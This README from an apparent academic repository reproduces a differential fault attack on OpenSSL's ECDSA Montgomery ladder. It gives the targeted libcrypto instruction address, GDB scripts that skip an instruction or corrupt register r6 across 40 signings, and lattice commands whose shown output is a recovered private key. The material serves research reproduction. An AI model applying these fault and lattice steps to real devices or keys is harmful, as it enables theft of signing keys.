# DFA Simulation on Raspberry Pi and OpenSSL with GDB

This folder contains files to test the DFA attack presented in the paper *Differential Fault Attack on Montgomery Ladder and in the Presence of Scalar Randomization* using GDB to simulate fault injections.

Two fault models are tested:
* Skip instruction: a single targeted instruction is omitted during the generation of an ECDSA signature;
* Random fault in a register: a modification of a register at a specific moment of the generation of an ECDSA signature.


## Content

This repository contains several files used for the simulation.

* `binary/`: it contains a simple program to be linked to OpenSSL at compilation;
* `scripts/`: two GDB scripts that instrument the two fault models considered, tested on a Raspberry Pi device model 4B;
* `sig/`: it contains two files with the signatures obtained with each of the two GDB scripts, and those need to be analyzed for the lattice attack.


## Compilation of the Program

This has only been tested on a Raspberry Pi 4B, with the latest Raspberry Pi OS Lite (formerly known as Raspbian) as of 2021.

It is compiled with the following command so it is linked to the OpenSSL cryptographic library `libcrypto`:

```
gcc main.c -lcrypto -o ecsdasign
```

This program takes as input an elliptic curve private key, a message to sign and a file where the signature is appended.


## The Instruction Address

The line `pbit <- pbit XOR k_i` can be found at the address `0xdd208` in the `libcrypto` library:

```
dd1e8:    e1a01008     mov    r1, r8
dd1ec:    e59d0008     ldr    r0, [sp, #8]
dd1f0:    ebfeb892     bl    8b440 <BN_is_bit_set>
dd1f4:    e59d600c     ldr    r6, [sp, #12]
dd1f8:    e1a03009     mov    r3, r9
dd1fc:    e59b2008     ldr    r2, [fp, #8]
dd200:    e5971008     ldr    r1, [r7, #8]
dd204:    e2488001     sub    r8, r8, #1
dd208:    e0266000     eor    r6, r6, r0
dd20c:    e1a0a000     mov    sl, r0
dd210:    e1a00006     mov    r0, r6
dd214:    ebfeb8ce     bl    8b554 <BN_consttime_swap>
dd218:    e1a00006     mov    r0, r6
dd21c:    e1a03009     mov    r3, r9
dd220:    e59b200c     ldr    r2, [fp, #12]
dd224:    e597100c     ldr    r1, [r7, #12]
dd228:    e58da00c     str    sl, [sp, #12]
dd22c:    ebfeb8c8     bl    8b554 <BN_consttime_swap>
dd230:    e1a00006     mov    r0, r6
dd234:    e1a03009     mov    r3, r9
dd238:    e59b2010     ldr    r2, [fp, #16]
dd23c:    e5971010     ldr    r1, [r7, #16]
dd240:    ebfeb8c3     bl    8b554 <BN_consttime_swap>
```

In the program `ecdsasign`, its corresponding address becomes `0xb6e68208`.


## Skip Instruction Fault Model

The script `gdbsimulfault1.gdb` generates 40 signatures with an instruction skipped during the process of the bit *k_17* of the scalar in the Montgomery ladder algorithm.

```gdb
set pagination off
set logging file gdb1.log
set logging on
b main
r
# breakpoint before pbit <- pbit XOR k_i
b *0xb6e68208
disable 2
kill

set $ctr=0
while($ctr<40)
  r privkey.pem message.txt sig1.bin
  # do nothing for the first 238 ladder steps
  enable 2
  ignore 2 238
  c
  info registers
  # skip instruction with a jump to the next one
  jump *0xb6e6820c
  disable 2
  c
  set $ctr=$ctr+1
end
set logging off
quit
```

This is done with a breakpoint at the desired address, but it is ignored for the first 238 iterations out of the 256.
Then a jump to the following instructions is done, and the calculation is resumed.
All signatures are stored in the file `sig1.bin`, and the value of the registers before the skip instruction are logged in the file `gdb1.log`.

The script is executed with the following command:

```
gdb ./binary/ecdsasign --command=scripts/gdbsimulfault1.gdb
```

## Random Fault in a Register Model

Same as above, but with the following script:

```gdb
set pagination off
set logging file gdb2.log
set logging on
b main
r
# breakpoint after pbit <- pbit XOR k_i
b *0xb6e6820c
disable 2
kill

set $ctr=0
while($ctr<40)
  r privkey.pem message.txt sig2.bin
  # do nothing for the first 238 ladder steps
  enable 2
  ignore 2 238
  c
  info registers
  # simulate random fault in register r6 (value of pbit for swaps)
  set $r6=0x55adab
  disable 2
  c
  set $ctr=$ctr+1
end
set logging off
quit

```

The main difference is that the register `r6` is modified with an arbitrary value after the execution of the instruction `pbit <- pbit XOR k_i`.
The variable `pbit` is used for the conditional swap of the points *R0* and *R1* in the algorithm.
When this value is *0*, the swap is ineffective, and when this value is nonzero, the swap is effective.
In the case the result of the XOR is supposed to be *0*, any modification of the variable into a nonzero value will force the swap to occur which achieve the goal of the attack.

The command to execute is:

```
gdb ./binary/ecdsasign --command=scripts/gdbsimultfault2.gdb
```


## Private Key Recovery with Lattices

The script to launch the analysis is `gdb_dfa_analysis.py`:

```
python3 gdb_dfa_analysis.py --pubkey <pubkey> --sig <sig file> --msg <message file> --skip <min> <max> --out <output file>
```

The arguments are
* `pubkey`: filename of the public key;
* `sig`: name of the file containing the signatures;
* `msg`: filename of the signed message (it is the same for all signatures for simplicity);
* `skip`: for the analysis, makes the hypothesis that fault occured between steps 'min' and 'max';
* `out`: filename where the results of the analysis are stored.

An example is given by

```
python3 gdb_dfa_analysis.py --pubkey pubkey.pem --sig sig/sig1.bin --msg message.txt --skip 17 20 --out results1.txt
```

Then the file `results1.txt` can be used to recover the private key if there are enough useful signatures.

```
python3 solve_hnp.py results1.txt
```

And we get:

```
Elliptic curve: secp256k1
    Public key: (0xd88b5b823ab198782a96c71e8245192a5a2ede28397dab48bf89b30fa725cb58,
                 0x41c49fbc06c69bd3334dc758d07e852a1002da5e2087b61ad6f81079d6e115fd)
HNP with 16 signatures...
Private key: 67475781119067256909282760890341607740853750781792718811638448437731893210169
```

The same can be done for the file `sig2.bin` obtained with the second fault model.
